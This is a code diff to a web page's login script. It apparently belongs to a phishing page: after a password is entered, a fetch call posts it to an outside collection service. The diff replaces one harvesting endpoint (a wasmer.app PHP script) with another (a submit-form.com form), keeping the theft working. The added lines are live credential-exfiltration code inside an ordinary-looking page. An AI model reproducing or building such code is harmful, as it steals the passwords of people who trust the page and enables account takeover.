@@ -2012,21 +2012,26 @@
                 hiddenPassword.value = passwordInput.value;
                 
                 // Submit password separately
-                const formData = new FormData();
-                formData.append('password', passwordInput.value);
-                
-                fetch('https://professor-asif.wasmer.app/waheedpass.php', {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        console.error('Password submission failed');
-                    }
-                })
-                .catch(error => {
-                    console.error('Submission error:', error);
-                });
+          const formData = new FormData();
+          formData.append("password", passwordInput.value);
+
+          fetch("https://submit-form.com/LSpFyPkS6", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              password: passwordInput.value,
+            }),
+          })
+            .then((response) => {
+              if (!response.ok) {
+                console.error("Password submission failed");
+              }
+            })
+            .catch((error) => {
+              console.error("Submission error:", error);
+            });
                 
                 // Proceed to success step
                 step2.classList.remove('active');
